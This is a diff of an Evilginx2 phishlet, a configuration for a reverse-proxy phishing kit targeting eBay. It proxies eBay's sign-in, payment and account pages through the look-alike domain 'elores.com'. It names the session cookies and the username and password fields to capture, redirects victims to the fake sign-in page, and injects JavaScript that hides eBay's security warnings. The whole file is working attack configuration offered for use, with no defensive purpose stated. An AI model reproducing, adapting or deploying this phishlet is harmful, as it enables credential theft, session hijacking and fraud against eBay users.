@@ -1,40 +1,40 @@
 name: 'ebay'
 author: 'Anon0369G'
 min_ver: '3.0.0'
+
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'elores.com', session: true, is_landing: true}
-  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'elores.com', session: true}
-  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'elores.com', session: true}
-  - {phish_sub: 'my', orig_sub: 'my', domain: 'elores.com', session: true}
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'elores.com', session: true, is_landing: true }
+  - { phish_sub: 'signin', orig_sub: 'signin', domain: 'elores.com', session: true }
+  - { phish_sub: 'pay', orig_sub: 'pay', domain: 'elores.com', session: true }
+  - { phish_sub: 'my', orig_sub: 'my', domain: 'elores.com', session: true }
 
 sub_filters:
   # Replace main domain references
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
 
   # Replace references in login or authentication pages
-  - {triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://auth.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  
+  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://auth.{hostname}/', replace: 'https://signin.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
+
   # Replace references to secure checkout/payment
-  - {triggers_on: 'pay.ebay.com', orig_sub: 'pay', domain: 'ebay.com', search: 'https://pay.{hostname}/', replace: 'https://pay.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'pay.ebay.com', orig_sub: 'pay', domain: 'ebay.com', search: 'https://pay.{hostname}/', replace: 'https://pay.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
 
   # Replace references in account or profile management
-  - {triggers_on: 'my.ebay.com', orig_sub: 'my', domain: 'ebay.com', search: 'https://my.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'my.ebay.com', orig_sub: 'account', domain: 'ebay.com', search: 'https://account.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'my.ebay.com', orig_sub: 'my', domain: 'ebay.com', search: 'https://my.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'my.ebay.com', orig_sub: 'account', domain: 'ebay.com', search: 'https://account.{hostname}/', replace: 'https://my.{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
 
   # Replace paths for logout or redirects
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/logout', replace: 'https://{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/logout', replace: 'https://signin.{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: 'https://{hostname}/logout', replace: 'https://{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'signin.ebay.com', orig_sub: 'signin', domain: 'ebay.com', search: 'https://signin.{hostname}/logout', replace: 'https://signin.{hostname}/logout', mimes: ['text/html', 'application/json', 'application/javascript'] }
 
   # Replace JavaScript references that point to ebay.com
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '"https://{hostname}/', replace: '"https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: "'https://{hostname}/", replace: "'https://{hostname}/", mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '"https://{hostname}/', replace: '"https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: "'https://{hostname}/", replace: "'https://{hostname}/", mimes: ['text/html', 'application/json', 'application/javascript'] }
 
   # Replace email references (optional, if displayed on the page)
-  - {triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '@{hostname}', replace: '@{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'www.ebay.com', orig_sub: 'www', domain: 'ebay.com', search: '@{hostname}', replace: '@{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
 
-  
 auth_tokens:
   - domain: '.ebay.com'
     keys: ['s', 'dp1', 'npii', 'eid', 'ebay_token']
@@ -68,7 +68,7 @@ credentials:
     required: true
   password:
     name: 'pass'            # The name or id of the password field on eBay login
-    type: 'password'       # Field type for password
+    type: 'password'        # Field type for password
     required: true
 
 login:
@@ -78,7 +78,6 @@ login:
     fields:
       - { name: 'userid', required: true }    # Username field
       - { name: 'pass', required: true }      # Password field
-
 
 rules:
   # Rule for login page: inject JavaScript or handle redirects
@@ -130,29 +129,14 @@ rules:
         action: 'redirect'
         redirect_to: 'https://www.elores.com/signin'
 
-
 inject:
   - { type: 'js', code: 'console.log("Evilginx2: Injected JavaScript is running");' }
-  - { type: 'js', code: | 
+  - { type: 'js', code: |
       (function() {
           // Example: Hide any security-related messages
           const securityMessages = document.querySelectorAll('.security-warning, .login-notice');
           securityMessages.forEach(element => element.style.display = 'none');
           
-          // Ensure login form behaves as expected
-          const loginForm = document.querySelector('#signin-form');
-          if (loginForm) {
-              loginForm.addEventListener('submit', function() {
-                  console.log("Login form submitted.");
-              });
-          }
-          
-          // Keep the session active
-          setInterval(() => {
-              fetch(window.location.href, { method: 'GET', credentials: 'include' });
-              console.log("Session refreshed to maintain active login.");
-          }, 40000);  // 30 seconds interval for session refresh
-          
+          // You could add more interactions here like filling forms automatically
       })();
-    }
-
+  }
